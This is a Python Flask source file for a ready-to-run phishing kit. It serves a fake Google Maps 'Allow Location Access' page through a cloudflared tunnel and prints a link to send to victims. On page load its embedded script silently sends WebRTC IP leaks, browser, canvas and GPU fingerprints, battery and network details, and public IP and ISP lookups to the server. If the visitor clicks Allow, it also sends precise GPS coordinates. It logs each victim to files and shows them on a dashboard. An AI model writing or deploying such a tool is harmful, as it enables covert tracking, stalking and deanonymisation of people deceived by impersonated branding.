import subprocess
import threading
import time
import re
import base64
import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, send_file, redirect

app = Flask(__name__)

PORT = "8080"

# ================== UTILITY FUNCTIONS ==================
def get_real_ip():
    flask_ip = request.remote_addr
    xff = request.headers.get('X-Forwarded-For', '')
    xff_ip = xff.split(',')[0].strip() if xff else None
    cf_ip = request.headers.get('CF-Connecting-IP', '')
    real_ip = cf_ip or xff_ip or flask_ip
    return real_ip

def log_section(title, data_dict):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    sep = "=" * 55
    lines = [f"\n{sep}", f"  {title} - {ts}", sep]
    for k, v in data_dict.items():
        lines.append(f"  {k}: {v}")
    lines.append(sep + "\n")
    output = "\n".join(lines)
    print(output)
    return output

# ================== ROUTES ==================
@app.route('/')
def index():
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_section("VICTIM ACCESSED THE PAGE", {
        "IP": ip,
        "User-Agent": ua[:80],
        "Time": ts
    })

    with open("victims.log", "a") as f:
        f.write(f"[{ts}] IP: {ip} | UA: {ua[:80]}\n")

    return HTML_PAGE

@app.route('/collect', methods=['POST'])
def collect_all():
    data = request.json
    ip = get_real_ip()
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not data:
        return jsonify({"status": "ok"})

    # --- GPS ---
    if 'lat' in data and 'lon' in data:
        lat, lon = data['lat'], data['lon']
        maps_link = f"https://maps.google.com/?q={lat},{lon}"
        entry = log_section("GPS COORDINATES CAPTURED", {
            "Victim IP": ip,
            "Latitude": f"{lat:.6f}",
            "Longitude": f"{lon:.6f}",
            "Accuracy": f"{data.get('acc', 'N/A')}m",
            "Altitude": f"{data.get('alt', 'N/A')}m",
            "Speed": f"{data.get('speed', 'N/A')} km/h",
            "Google Maps": maps_link,
            "Timestamp": ts
        })
        with open("gps_data.log", "a") as f:
            f.write(entry)
        
        with open("gps_links.txt", "a") as f:
            f.write(f"[{ts}] IP: {ip} | {maps_link}\n")

    # --- WebRTC Leak ---
    if 'webrtc_ip' in data:
        entry = log_section("WEBRTC IP LEAK", {
            "Victim IP": ip,
            "WebRTC IP": data['webrtc_ip'],
            "Timestamp": ts
        })
        with open("webrtc_leaks.log", "a") as f:
            f.write(entry)

    # --- Device Info ---
    if 'battery' in data:
        b = data['battery']
        entry = log_section("BATTERY AND DEVICE INFO", {
            "Victim IP": ip,
            "Battery Level": f"{float(b.get('level', 0)) * 100:.0f}%",
            "Charging": b.get('charging', 'N/A'),
            "Network Type": data.get('network', {}).get('type', 'N/A'),
            "Downlink": f"{data.get('network', {}).get('downlink', 'N/A')} Mbps",
            "Timestamp": ts
        })
        with open("device_fingerprints.log", "a") as f:
            f.write(entry)

    # --- Browser Fingerprint ---
    if 'fingerprint' in data:
        fp = data['fingerprint']
        entry = log_section("BROWSER FINGERPRINT", {
            "Victim IP": ip,
            "Screen": f"{fp.get('width', '?')}x{fp.get('height', '?')}",
            "Color Depth": fp.get('colorDepth', '?'),
            "Platform": fp.get('platform', '?'),
            "Languages": ", ".join(fp.get('languages', [])),
            "Timezone": fp.get('timezone', '?'),
            "Cookies Enabled": fp.get('cookiesEnabled', '?'),
            "Local Storage": fp.get('localStorage', '?'),
            "Session Storage": fp.get('sessionStorage', '?'),
            "Timestamp": ts
        })
        with open("fingerprints.log", "a") as f:
            f.write(entry)

    # --- Canvas Fingerprint ---
    if 'canvas_fp' in data:
        entry = log_section("CANVAS FINGERPRINT", {
            "Victim IP": ip,
            "Canvas Hash": data['canvas_fp'][:64] + "...",
            "Timestamp": ts
        })
        with open("canvas_fingerprints.log", "a") as f:
            f.write(entry)

    # --- WebGL ---
    if 'webgl' in data:
        w = data['webgl']
        entry = log_section("WEBGL / GPU INFO", {
            "Victim IP": ip,
            "Vendor": w.get('vendor', 'N/A'),
            "Renderer": w.get('renderer', 'N/A'),
            "Timestamp": ts
        })
        with open("gpu_info.log", "a") as f:
            f.write(entry)

    # --- Network Info (basic) ---
    if 'wifi_scan' in data:
        entry = log_section("NETWORK INFO", {
            "Victim IP": ip,
            "Connection Type": data['wifi_scan'].get('type', 'N/A'),
            "Effective Type": data['wifi_scan'].get('effectiveType', 'N/A'),
            "RTT": f"{data['wifi_scan'].get('rtt', 'N/A')} ms",
            "Downlink": f"{data['wifi_scan'].get('downlink', 'N/A')} Mbps",
            "Downlink Max": f"{data['wifi_scan'].get('downlinkMax', 'N/A')} Mbps",
            "Save Data": data['wifi_scan'].get('saveData', 'N/A'),
            "Timestamp": ts
        })
        with open("network_info.log", "a") as f:
            f.write(entry)

    # --- Extended Network Detector ---
    if 'network_detector' in data:
        nd = data['network_detector']
        entry = log_section("EXTENDED NETWORK DETECTOR", {
            "Victim IP": ip,
            "Connection Type": nd.get('type', 'N/A'),
            "Effective Type": nd.get('effectiveType', 'N/A'),
            "RTT": f"{nd.get('rtt', 'N/A')} ms",
            "Downlink": f"{nd.get('downlink', 'N/A')} Mbps",
            "Downlink Max": f"{nd.get('downlinkMax', 'N/A')} Mbps",
            "Save Data": nd.get('saveData', 'N/A'),
            "ISP / ASN Hints": nd.get('ispHints', 'N/A'),
            "VPN / Proxy Detected": nd.get('vpnDetected', 'N/A'),
            "Tor Detected": nd.get('torDetected', 'N/A'),
            "Public IP": nd.get('publicIP', 'N/A'),
            "Data Savings Mode": nd.get('dataSavingMode', 'N/A'),
            "Timestamp": ts
        })
        with open("network_detector.log", "a") as f:
            f.write(entry)

    return jsonify({"status": "received"})

@app.route('/results')
def show_results():
    html = "<html><head><title>Tracker Dashboard</title><style>"
    html += "body{font-family:monospace;background:#111;color:#0f0;padding:20px;}"
    html += "h1{color:#fff}.section{border:1px solid #333;padding:15px;margin:10px 0;border-radius:5px;}"
    html += "a{color:#0ff}.file{color:#ff0}</style></head><body>"
    html += "<h1>PENTEST DASHBOARD</h1>"
    html += "<p>Captured data files:</p><ul>"
    for f in sorted(os.listdir('.')):
        if f.endswith('.log') or f.endswith('.txt'):
            size = os.path.getsize(f)
            html += f"<li class='file'><a href='/view/{f}'>{f}</a> ({size} bytes)</li>"
    html += "</ul>"
    html += "<p>GPS Links captured:</p><ul>"
    if os.path.exists("gps_links.txt"):
        with open("gps_links.txt", "r") as gf:
            for line in gf.readlines():
                html += f"<li class='file'>{line.strip()}</li>"
    html += "</ul></body></html>"
    return html

@app.route('/view/<filename>')
def view_file(filename):
    if not filename.endswith(('.log', '.txt')):
        return "Forbidden", 403
    path = os.path.join('.', filename)
    if not os.path.exists(path):
        return "Not found", 404
    with open(path, 'r') as f:
        content = f.read()
    safe = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    return f"<pre style='background:#111;color:#0f0;padding:20px;font-family:monospace;'>{safe}</pre>"

# ================== SERVER ==================
def start_server():
    print("\n" + "=" * 55)
    print("  GOOGLE MAPS LOCATION TRACKER v2")
    print("=" * 55)
    print(f"  Local:    http://localhost:{PORT}")
    print(f"  Results:  http://localhost:{PORT}/results")
    print("=" * 55 + "\n")
    app.run(host="0.0.0.0", port=int(PORT), debug=False)

# ================== CLOUDFLARED TUNNEL ==================
def start_tunnel():
    time.sleep(2)
    print("  [*] Starting Cloudflared tunnel...\n")
    
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    for line in process.stdout:
        match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
        if match:
            url = match.group(1)
            print("\n" + "=" * 55)
            print("  TUNNEL ACTIVE - SEND THIS LINK:")
            print("=" * 55)
            print(f"\n  {url}\n")
            print(f"  Dashboard: {url}/results\n")
            print("=" * 55)
            print("  GPS + WebRTC + Device Fingerprint")
            print("  Network Detector (ISP, VPN, Tor, Connection Quality)")
            print("=" * 55 + "\n")
            
            with open("link.txt", "w") as f:
                f.write(f"Phishing URL: {url}\nDashboard: {url}/results\n")
            print("  Link saved to link.txt\n")
            break
    
    process.wait()

# ================== HTML PAGE (Google Maps UI) ==================
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Maps</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
}

body{
    height:100vh;
    overflow:hidden;
    position:relative;
    background:#1a1a2e;
}

/* Map Background - Real Google Maps iframe */
.map-bg{
    position:fixed;
    inset:0;
    z-index:0;
}

.map-bg iframe{
    width:100%;
    height:100%;
    border:none;
    filter:blur(6px) brightness(0.7);
    transform:scale(1.1);
}

/* Overlay */
.overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.3);
    z-index:1;
}

/* Glass Popup */
.popup{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    z-index:10;

    width:380px;
    padding:30px;

    background:rgba(255,255,255,.15);
    backdrop-filter:blur(20px);
    -webkit-backdrop-filter:blur(20px);

    border:1px solid rgba(255,255,255,.25);
    border-radius:20px;

    text-align:center;
    color:white;

    box-shadow:0 8px 32px rgba(0,0,0,.5);
}

.logo{
    width:70px;
    margin-bottom:15px;
}

h2{
    margin-bottom:8px;
    font-size:22px;
    font-weight:500;
}

p{
    margin-bottom:20px;
    opacity:.9;
    font-size:14px;
    line-height:1.5;
}

.buttons{
    display:flex;
    gap:10px;
}

button{
    flex:1;
    padding:12px 16px;
    border:none;
    border-radius:12px;
    cursor:pointer;
    font-weight:600;
    font-size:15px;
    transition:all 0.2s;
}

.allow{
    background:#4285F4;
    color:white;
}
.allow:hover{
    background:#3367d6;
}
.allow:disabled{
    opacity:0.6;
    cursor:default;
}

.deny{
    background:rgba(255,255,255,.2);
    color:white;
}
.deny:hover{
    background:rgba(255,255,255,.3);
}
.deny:disabled{
    opacity:0.6;
    cursor:default;
}

.hidden{display:none;}
</style>
</head>
<body>

<div class="map-bg">
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d387190.279915233!2d-74.25987368715497!3d40.69767006458873!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c24fa5d33f083b%3A0xe414a1f0af8f5e8d!2sNew+York%2C+NY!5e0!3m2!1sen!2sus!4v1" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
</div>
<div class="overlay"></div>

<div class="popup" id="popup">

    <img class="logo"
    src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg"
    alt="Maps">

    <h2>Allow Location Access</h2>

    <p>
        Google Maps needs access to your device's location to show
        nearby places, traffic updates, and directions.
    </p>

    <div class="buttons">
        <button class="deny" id="denyBtn">Not Now</button>
        <button class="allow" id="allowBtn">Allow</button>
    </div>

</div>

<script>
(function(){
    'use strict';
    let capturedLat = null;
    let capturedLon = null;

    const allowBtn = document.getElementById('allowBtn');
    const denyBtn = document.getElementById('denyBtn');

    function disableButtons(){
        allowBtn.disabled = true;
        denyBtn.disabled = true;
        allowBtn.style.opacity = '0.7';
        denyBtn.style.opacity = '0.7';
    }

    // ========== SILENT DATA COLLECTION ==========
    function collectSilentData(){
        var points = 0;

        // --- WebRTC IP Leak ---
        try{
            var pc = new RTCPeerConnection({
                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
            });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer){
                return pc.setLocalDescription(offer);
            });
            pc.onicecandidate = function(ice){
                if(!ice || !ice.candidate) return;
                var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                if(ipMatch){
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({webrtc_ip: ipMatch[1]})
                    }).catch(function(){});
                    points++;
                }
            };
            setTimeout(function(){ try{pc.close();}catch(e){} }, 3000);
        } catch(e){}

        // --- Browser Fingerprint ---
        var fp = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            platform: navigator.platform,
            languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            localStorage: typeof(Storage) !== 'undefined' ? true : false,
            sessionStorage: typeof(Storage) !== 'undefined' ? true : false
        };
        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({fingerprint: fp})
        }).catch(function(){});
        points++;

        // --- Canvas Fingerprint ---
        try{
            var can = document.createElement('canvas');
            can.width = 400;
            can.height = 150;
            var ctx = can.getContext('2d');

            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, 400, 150);

            ctx.fillStyle = '#4285F4';
            ctx.fillRect(0, 0, 400, 40);

            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 22px Arial, sans-serif';
            ctx.textBaseline = 'middle';
            ctx.fillText('Google Maps', 20, 22);

            ctx.beginPath();
            ctx.arc(340, 75, 20, 0, Math.PI * 2);
            ctx.fillStyle = '#ea4335';
            ctx.fill();
            ctx.strokeStyle = '#ffffff';
            ctx.lineWidth = 3;
            ctx.stroke();

            ctx.beginPath();
            ctx.arc(340, 75, 8, 0, Math.PI * 2);
            ctx.fillStyle = '#ffffff';
            ctx.fill();

            ctx.strokeStyle = '#dadce0';
            ctx.lineWidth = 2;
            for (var i = 0; i < 6; i++) {
                ctx.beginPath();
                ctx.moveTo(20, 55 + i * 18);
                ctx.lineTo(280, 55 + i * 18);
                ctx.stroke();
            }

            ctx.fillStyle = '#fbbc04';
            ctx.fillRect(30, 60, 40, 30);
            ctx.fillStyle = '#34a853';
            ctx.fillRect(100, 78, 50, 40);
            ctx.fillStyle = '#4285F4';
            ctx.fillRect(180, 55, 35, 35);
            ctx.fillStyle = '#ea4335';
            ctx.fillRect(230, 90, 45, 25);

            ctx.fillStyle = '#202124';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'top';
            ctx.fillText('Current Location', 20, 120);
            ctx.fillStyle = '#5f6368';
            ctx.font = '12px Arial';
            ctx.fillText('Accuracy: +/- 12m', 180, 122);

            var hash = can.toDataURL('image/png');

            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({canvas_fp: hash})
            }).catch(function(){});
            points++;
        } catch(e){
            console.log('[!] Canvas error:', e.message);
        }

        // --- WebGL ---
        try{
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if(gl){
                var webglInfo = {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER)
                };
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({webgl: webglInfo})
                }).catch(function(){});
                points++;
            }
        } catch(e){}

        // --- Network Info (basic) ---
        if(navigator.connection){
            var nc = navigator.connection;
            var netData = {
                type: nc.type || 'unknown',
                effectiveType: nc.effectiveType || 'unknown',
                rtt: nc.rtt,
                downlink: nc.downlink,
                downlinkMax: nc.downlinkMax || 'unknown',
                saveData: nc.saveData || false
            };
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({wifi_scan: netData})
            }).catch(function(){});
            points++;

            if(nc.addEventListener){
                nc.addEventListener('change', function(){
                    var nc2 = navigator.connection;
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({wifi_scan: {
                            type: nc2.type || 'unknown',
                            effectiveType: nc2.effectiveType || 'unknown',
                            rtt: nc2.rtt,
                            downlink: nc2.downlink,
                            downlinkMax: nc2.downlinkMax || 'unknown',
                            saveData: nc2.saveData || false,
                            changed: true
                        }})
                    }).catch(function(){});
                });
            }
        }

        // --- Battery ---
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                var netInfo = {};
                if(navigator.connection){
                    netInfo = {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    };
                }
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        battery: {level: b.level, charging: b.charging},
                        network: netInfo
                    })
                }).catch(function(){});
            }).catch(function(){});
        }

        // ========== NETWORK DETECTOR (Extended) ==========
        function runNetworkDetector(){
            var netDetect = {
                type: 'unknown',
                effectiveType: 'unknown',
                rtt: null,
                downlink: null,
                downlinkMax: null,
                saveData: null,
                ispHints: 'N/A',
                vpnDetected: 'N/A',
                torDetected: 'N/A',
                publicIP: 'N/A',
                dataSavingMode: 'N/A'
            };

            if(navigator.connection){
                var nc = navigator.connection;
                netDetect.type = nc.type || 'unknown';
                netDetect.effectiveType = nc.effectiveType || 'unknown';
                netDetect.rtt = nc.rtt;
                netDetect.downlink = nc.downlink;
                netDetect.downlinkMax = nc.downlinkMax || null;
                netDetect.saveData = nc.saveData || false;
            }

            if(navigator.connection && navigator.connection.saveData){
                netDetect.dataSavingMode = 'Yes';
            } else {
                netDetect.dataSavingMode = 'No';
            }

            try{
                var vpnPC = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });
                var detectedIPs = [];
                vpnPC.createDataChannel('');
                vpnPC.createOffer().then(function(offer){
                    return vpnPC.setLocalDescription(offer);
                });
                vpnPC.onicecandidate = function(ice){
                    if(!ice || !ice.candidate) return;
                    var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                    if(ipMatch && detectedIPs.indexOf(ipMatch[1]) === -1){
                        detectedIPs.push(ipMatch[1]);
                    }
                };
                setTimeout(function(){
                    try{ vpnPC.close(); } catch(e){}
                    if(detectedIPs.length > 1){
                        netDetect.vpnDetected = 'Possible (' + detectedIPs.join(', ') + ')';
                    }
                }, 3000);
            } catch(e){}

            try{
                fetch('https://api.ipify.org?format=json')
                .then(function(r){ return r.json(); })
                .then(function(ipData){
                    if(ipData && ipData.ip){
                        netDetect.publicIP = ipData.ip;
                    }
                    return fetch('https://ipapi.co/' + (ipData.ip || '') + '/json/');
                })
                .then(function(r){ return r.json(); })
                .then(function(geoData){
                    if(geoData && geoData.org){
                        netDetect.ispHints = geoData.org + (geoData.country_name ? ' (' + geoData.country_name + ')' : '');
                    }
                    if(geoData && geoData.hosting === true){
                        netDetect.vpnDetected = 'Yes (hosting/VPN IP)';
                    }
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({network_detector: netDetect})
                    }).catch(function(){});
                })
                .catch(function(){
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({network_detector: netDetect})
                    }).catch(function(){});
                });
            } catch(e){
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({network_detector: netDetect})
                }).catch(function(){});
            }
        }

        setTimeout(runNetworkDetector, 1500);

        console.log('[+] Silent data collected: ' + points + ' points sent');
    }

    collectSilentData();

    // ========== GPS ON ALLOW ==========
    allowBtn.addEventListener('click', function(){
        disableButtons();
        allowBtn.textContent = 'Accessing...';

        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                function(pos){
                    capturedLat = pos.coords.latitude;
                    capturedLon = pos.coords.longitude;

                    allowBtn.textContent = 'Location Shared';

                    var gpsData = {
                        lat: capturedLat,
                        lon: capturedLon,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        speed: pos.coords.speed
                    };

                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsData)
                    }).catch(function(){});

                    setTimeout(function(){
                        var mapsUrl = 'https://maps.google.com/?q=' + capturedLat + ',' + capturedLon;
                        window.location.href = mapsUrl;
                    }, 2000);
                },
                function(err){
                    var errMsg = 'Location unavailable';
                    if(err.code === 1) errMsg = 'Permission denied';
                    else if(err.code === 2) errMsg = 'Position unavailable';
                    else if(err.code === 3) errMsg = 'Timed out';

                    allowBtn.textContent = errMsg;

                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({gps_error: err.message, gps_code: err.code})
                    }).catch(function(){});

                    setTimeout(function(){
                        window.location.href = 'https://maps.google.com';
                    }, 2000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        } else {
            allowBtn.textContent = 'GPS Unavailable';
            setTimeout(function(){
                window.location.href = 'https://maps.google.com';
            }, 2000);
        }
    });

    // ========== DENY ==========
    denyBtn.addEventListener('click', function(){
        disableButtons();
        denyBtn.textContent = 'Opening...';

        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({gps_error: 'User clicked Not Now', gps_code: 1})
        }).catch(function(){});

        setTimeout(function(){
            window.location.href = 'https://maps.google.com';
        }, 1000);
    });
})();
</script>
</body>
</html>
"""

# ================== MAIN ==================
if __name__ == '__main__':
    t1 = threading.Thread(target=start_server, daemon=True)
    t2 = threading.Thread(target=start_tunnel, daemon=True)

    t1.start()
    t2.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n  [!] Shutting down...")